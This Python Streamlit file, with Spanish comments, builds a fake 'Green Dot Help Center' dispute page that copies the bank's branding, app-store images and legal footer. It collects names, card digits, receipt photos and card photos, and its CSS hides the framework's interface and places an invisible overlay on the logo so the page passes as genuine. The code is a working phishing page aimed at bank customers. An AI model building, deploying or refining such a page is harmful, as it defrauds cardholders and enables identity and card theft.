
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- CSS DE AJUSTE DE LOGO Y BLOQUEO TOTAL ---
st.markdown("""<style>
/* 1. Capa invisible ajustada al tamaño del logo */
.stApp::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 150px;
    z-index: 999999;
    pointer-events: all;
    background: transparent;
}

/* 2. Reducir espacios superiores y eliminar anclas de títulos */
.block-container {
    padding-top: 1rem !important;
}

/* Ocultar el icono de link (#) que aparece al lado de los títulos */
.section-anchor, a.section-anchor, [data-testid='stHeaderActionElements'], .st-emotion-cache-15zrgzn {
    display: none !important;
    visibility: hidden !important;
}

/* 3. Ocultar elementos nativos */
header, footer, .stDeployButton, [data-testid='stHeader'], [data-testid='stToolbar'] {
    display: none !important;
    visibility: hidden !important;
}

/* Desactivar puntero en h1 para evitar que actúe como link */
h1 a, h1 {
    pointer-events: none !important;
    cursor: default !important;
    text-decoration: none !important;
    color: white !important;
}

/* 4. Estética General */
.stApp {
    background-color: #000000 !important;
    color: #FFFFFF !important;
}

.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border: none !important;
    width: 100%;
    padding: 15px !important;
    font-weight: bold !important;
    text-transform: uppercase;
}

input {
    background-color: #111 !important;
    color: white !important;
    border: 1px solid #333 !important;
}

.app-promo-container {
    background-color: #111111;
    padding: 40px 20px;
    text-align: center;
    border-radius: 12px;
    margin: 30px 0;
    border: 1px solid #222;
}

.legal-footer {
    font-size: 11px;
    color: #666;
    text-align: justify;
    margin-top: 60px;
    border-top: 1px solid #222;
    padding-top: 20px;
    line-height: 1.5;
}
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=250)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("dispute_form", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Last 4 digits of Card")
    monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
    st.markdown("**Upload Evidence**")
    rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT NOW")

if submitted:
    if nombre and rec and car:
        st.success("✅ Claim received.")

st.markdown("""<div class='app-promo-container'>
    <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
    </div>
    <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
    * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
    Green Dot® cards are issued by Green Dot Bank, Member FDIC.<br><br>
    ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
</div>""", unsafe_allow_html=True)
